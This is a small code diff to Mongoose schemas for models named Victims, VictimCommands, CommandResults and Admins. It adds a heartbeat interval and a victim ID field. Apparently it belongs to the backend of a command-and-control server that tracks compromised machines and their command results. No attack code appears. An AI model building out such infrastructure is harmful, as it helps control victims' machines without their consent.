@@ -15,6 +15,7 @@ const Victims = mongoose.model("Victims", {
 	handshakeDate: Date,
 	refreshToken: String,
 	refreshTokenExpiry: Date,
+	heartBeatInterval: Number // in seconds
 });
 
 const VictimCommands = mongoose.model("VictimCommands", {
@@ -27,6 +28,7 @@ const CommandResults = mongoose.model("CommandResults", {
 	commandId: String,
 	result: String,
 	resultRecievedOn: Date,
+	victimId: String
 });
 
 const Admins = mongoose.model("Admins", {
